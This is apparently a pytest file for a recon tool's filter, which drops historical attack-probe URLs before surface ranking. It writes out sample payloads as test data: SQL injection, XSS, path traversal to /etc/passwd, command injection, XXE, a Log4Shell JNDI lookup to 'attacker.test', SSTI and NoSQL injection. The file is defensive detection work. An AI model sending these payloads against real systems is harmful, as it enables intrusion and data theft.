"""Tests for surface.py payload-marker filter (PR-17).

Covers the helpers that filter waymore/gau historical attack probes
from URL lists before they reach the surface ranker, plus the
load_surface_context wiring that drops probes from each input list.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "tools"))

from surface import (  # noqa: E402
    filter_attack_probes,
    is_attack_probe,
    load_surface_context,
)


class TestIsAttackProbe:
    """Each marker family must trigger detection on canonical examples
    AND must NOT fire on lookalike-but-legit URLs (false positives are
    expensive — they hide real surface)."""

    # ---- positive cases (one per family) ----

    def test_sqli_union_select(self):
        assert is_attack_probe("/bin/querybuilder.json?path=/etc&UNION+SELECT+1,2,3")

    def test_sqli_or_1_eq_1(self):
        assert is_attack_probe("/login?user=admin'+OR+1=1--")

    def test_sqli_quote_or_quote(self):
        assert is_attack_probe("/u?id=1' OR '1'='1")

    def test_sqli_sleep(self):
        assert is_attack_probe("/api?q=1; SLEEP(5)--")

    def test_xss_script_tag(self):
        assert is_attack_probe("/search?q=<script>alert(1)</script>")

    def test_xss_encoded_script(self):
        assert is_attack_probe("/x?p=%3Cscript%3Ealert(1)%3C/script%3E")

    def test_xss_event_handler(self):
        assert is_attack_probe('/x?p=" onerror=alert(1) "')

    def test_xss_javascript_uri(self):
        assert is_attack_probe("/redirect?url=javascript:alert(1)")

    def test_path_traversal(self):
        assert is_attack_probe("/file?path=../../etc/passwd")

    def test_path_traversal_encoded(self):
        assert is_attack_probe("/file?path=%2e%2e%2fetc/passwd")

    def test_etc_passwd(self):
        assert is_attack_probe("/static?file=etc/passwd")

    def test_proc_self(self):
        assert is_attack_probe("/file?path=/proc/self/environ")

    def test_rce_eval(self):
        assert is_attack_probe("/api?cmd=eval(payload)")

    def test_rce_phpinfo(self):
        assert is_attack_probe("/x?run=phpinfo()")

    def test_rce_command_injection(self):
        assert is_attack_probe("/api?host=127.0.0.1;cat /etc/passwd")

    def test_rce_dollar_paren(self):
        assert is_attack_probe("/api?host=$(whoami)")

    def test_xxe_xml(self):
        assert is_attack_probe('/api?body=<?xml version="1.0"?><!ENTITY xxe SYSTEM "file:///etc/passwd">')

    def test_log4shell_jndi(self):
        assert is_attack_probe("/api?h=${jndi:ldap://attacker.test/x}")

    def test_log4shell_obfuscated(self):
        assert is_attack_probe("/api?h=${lower:j}ndi:ldap://x.com/y")

    def test_ssti_jinja(self):
        assert is_attack_probe("/page?name={{7*7}}")

    def test_ssti_dollar_braces(self):
        assert is_attack_probe("/x?n=${{7*7}}")

    def test_ssti_erb(self):
        assert is_attack_probe("/x?n=<%= 7*7 %>")

    def test_ssti_freemarker(self):
        assert is_attack_probe("/x?n=#{7*7}")

    def test_nosqli_ne(self):
        assert is_attack_probe("/login?user[$ne]=admin")

    def test_nosqli_where_encoded(self):
        assert is_attack_probe("/api?q=%24where")

    # ---- negative cases (must NOT flag) ----

    def test_legit_search(self):
        assert not is_attack_probe("/search?q=ginandjuice")

    def test_legit_orders(self):
        assert not is_attack_probe("/api/orders/123?status=open")

    def test_legit_oauth(self):
        assert not is_attack_probe("/auth/oauth?redirect_uri=https://example.com/cb")

    def test_legit_blog(self):
        assert not is_attack_probe("/blog/2026/05/post-title")

    def test_legit_email(self):
        assert not is_attack_probe("/users?email=test@example.com")

    def test_empty_url(self):
        assert not is_attack_probe("")

    def test_legit_bin_querybuilder(self):
        # The endpoint itself is fine — only the UNION SELECT payload
        # query makes it a probe
        assert not is_attack_probe("/bin/querybuilder.json?p.hits=full")

    def test_legit_relative(self):
        assert not is_attack_probe("/")

    def test_legit_word_evaluation(self):
        # 'evaluation' contains 'eval' but should not flag (eval is
        # bounded by \( in the regex)
        assert not is_attack_probe("/api/evaluation/123")

    def test_legit_word_system(self):
        # 'system' as a path segment without ( should not flag
        assert not is_attack_probe("/api/system/health")


class TestFilterAttackProbes:
    def test_filters_probes_keeps_legit(self):
        urls = [
            "/api/orders/1",
            "/search?q=<script>alert(1)</script>",
            "/auth/oauth?redirect_uri=x",
            "/file?path=../../etc/passwd",
        ]
        kept = filter_attack_probes(urls)
        assert kept == ["/api/orders/1", "/auth/oauth?redirect_uri=x"]

    def test_empty_input(self):
        assert filter_attack_probes([]) == []

    def test_all_legit(self):
        urls = ["/a", "/b", "/c"]
        assert filter_attack_probes(urls) == urls

    def test_all_probes(self):
        urls = ["/x?q=<script>", "/y?z=../../etc/passwd"]
        assert filter_attack_probes(urls) == []

    def test_log_file_written_when_dropped(self, tmp_path):
        log = tmp_path / "filtered.txt"
        urls = [
            "/api/orders/1",
            "/x?q=<script>alert(1)</script>",
            "/y?z=${jndi:ldap://x}",
        ]
        kept = filter_attack_probes(urls, log_path=log)
        assert len(kept) == 1
        assert log.is_file()
        log_content = log.read_text(encoding="utf-8").splitlines()
        assert "/x?q=<script>alert(1)</script>" in log_content
        assert "/y?z=${jndi:ldap://x}" in log_content

    def test_log_file_not_created_when_no_drops(self, tmp_path):
        log = tmp_path / "filtered.txt"
        urls = ["/api/orders/1", "/auth/oauth"]
        filter_attack_probes(urls, log_path=log)
        assert not log.is_file()

    def test_log_file_appends_across_calls(self, tmp_path):
        log = tmp_path / "filtered.txt"
        filter_attack_probes(["/a?q=<script>"], log_path=log)
        filter_attack_probes(["/b?q=${jndi:ldap}"], log_path=log)
        assert log.is_file()
        lines = log.read_text(encoding="utf-8").splitlines()
        assert "/a?q=<script>" in lines
        assert "/b?q=${jndi:ldap}" in lines


class TestLoadSurfaceContextFilters:
    def _seed(self, tmp_path: Path, target: str,
              api_urls: list[str], param_urls: list[str]) -> None:
        recon_dir = tmp_path / "recon" / target
        urls_dir = recon_dir / "urls"
        urls_dir.mkdir(parents=True)
        (urls_dir / "api_endpoints.txt").write_text(
            "\n".join(api_urls), encoding="utf-8"
        )
        (urls_dir / "with_params.txt").write_text(
            "\n".join(param_urls), encoding="utf-8"
        )
        # httpx_full needed so available=True
        live_dir = recon_dir / "live"
        live_dir.mkdir(parents=True)
        (live_dir / "httpx_full.txt").write_text(
            "https://x.com/ [200] [App] [tech]", encoding="utf-8"
        )

    def test_param_urls_lose_probes(self, tmp_path):
        self._seed(tmp_path, "x.com",
                   api_urls=[],
                   param_urls=[
                       "/api/orders/1?status=open",
                       "/x?q=<script>alert(1)</script>",
                       "/file?path=../../etc/passwd",
                       "/search?q=foo",
                   ])
        ctx = load_surface_context(tmp_path, "x.com")
        assert "/api/orders/1?status=open" in ctx["param_urls"]
        assert "/search?q=foo" in ctx["param_urls"]
        # Probes filtered out
        assert "/x?q=<script>alert(1)</script>" not in ctx["param_urls"]
        assert "/file?path=../../etc/passwd" not in ctx["param_urls"]

    def test_filtered_probes_log_written(self, tmp_path):
        self._seed(tmp_path, "x.com",
                   api_urls=[],
                   param_urls=[
                       "/api/orders/1",
                       "/x?q=<script>alert(1)</script>",
                   ])
        load_surface_context(tmp_path, "x.com")
        log = tmp_path / "recon" / "x.com" / "urls" / "_filtered_attack_probes.txt"
        assert log.is_file()
        assert "<script>" in log.read_text(encoding="utf-8")

    def test_clean_input_no_log_file(self, tmp_path):
        self._seed(tmp_path, "x.com",
                   api_urls=["/api/v1/orders"],
                   param_urls=["/search?q=foo"])
        load_surface_context(tmp_path, "x.com")
        log = tmp_path / "recon" / "x.com" / "urls" / "_filtered_attack_probes.txt"
        assert not log.is_file()

    def test_log_resets_between_loads(self, tmp_path):
        """Re-loading context must NOT accumulate probes from prior runs."""
        self._seed(tmp_path, "x.com",
                   api_urls=[],
                   param_urls=["/x?q=<script>alert(1)</script>"])
        load_surface_context(tmp_path, "x.com")
        log = tmp_path / "recon" / "x.com" / "urls" / "_filtered_attack_probes.txt"
        first = log.read_text(encoding="utf-8")
        # Load again with the same input
        load_surface_context(tmp_path, "x.com")
        second = log.read_text(encoding="utf-8")
        # Same content, NOT doubled
        assert first == second


# ─── PR-19: page → JS helpers wired into load_surface_context ───────────────
class TestLoadSurfaceContextPageJsHelpers:
    """AC6: pages_for_js / js_for_page closures must be present in the
    surface context dict and return expected lookups (or empty lists when
    no per-page map has been built)."""

    def _seed_recon_only(self, tmp_path, target):
        """Minimal recon scaffold so available=True without any browser
        captures."""
        recon_dir = tmp_path / "recon" / target
        live = recon_dir / "live"
        live.mkdir(parents=True)
        (live / "httpx_full.txt").write_text(
            "https://x.com/ [200] [App] [tech]", encoding="utf-8"
        )
        (recon_dir / "urls").mkdir()
        return recon_dir

    def test_helpers_return_empty_lists_when_map_missing(self, tmp_path):
        self._seed_recon_only(tmp_path, "x.com")
        ctx = load_surface_context(tmp_path, "x.com")
        # Closures present even with empty map
        assert callable(ctx["pages_for_js"])
        assert callable(ctx["js_for_page"])
        assert ctx["pages_for_js"]("https://x.com/anything.js") == []
        assert ctx["js_for_page"]("https://x.com/blog") == []

    def test_helpers_resolve_when_map_present(self, tmp_path):
        self._seed_recon_only(tmp_path, "x.com")
        # Hand-write a page_js_map.json (simulates a prior capture run)
        browser_dir = tmp_path / "recon" / "x.com" / "browser"
        browser_dir.mkdir(parents=True)
        import json as _json
        (browser_dir / "page_js_map.json").write_text(_json.dumps({
            "generated_at": "2026-05-15T10:00:00Z",
            "target_key": "x.com",
            "pages": {
                "https://x.com/blog": {
                    "captured_at": "2026-05-15T10:00:00Z",
                    "capture_dirs": ["evidence/x.com/browser/abc"],
                    "js_files": [
                        "https://x.com/static/searchLogger.js",
                        "https://x.com/static/deparam.js",
                    ],
                },
                "https://x.com/catalog": {
                    "captured_at": "2026-05-15T10:10:00Z",
                    "capture_dirs": ["evidence/x.com/browser/def"],
                    "js_files": ["https://x.com/static/bundle.js"],
                },
            },
            "js_index": {
                "https://x.com/static/searchLogger.js": ["https://x.com/blog"],
                "https://x.com/static/deparam.js": ["https://x.com/blog"],
                "https://x.com/static/bundle.js": ["https://x.com/catalog"],
            },
        }), encoding="utf-8")

        ctx = load_surface_context(tmp_path, "x.com")
        assert ctx["pages_for_js"]("https://x.com/static/searchLogger.js") == [
            "https://x.com/blog",
        ]
        assert ctx["js_for_page"]("https://x.com/blog") == [
            "https://x.com/static/searchLogger.js",
            "https://x.com/static/deparam.js",
        ]
        # Unknown lookups still return [] (never raise / KeyError)
        assert ctx["pages_for_js"]("https://x.com/missing.js") == []
        assert ctx["js_for_page"]("https://x.com/never-visited") == []
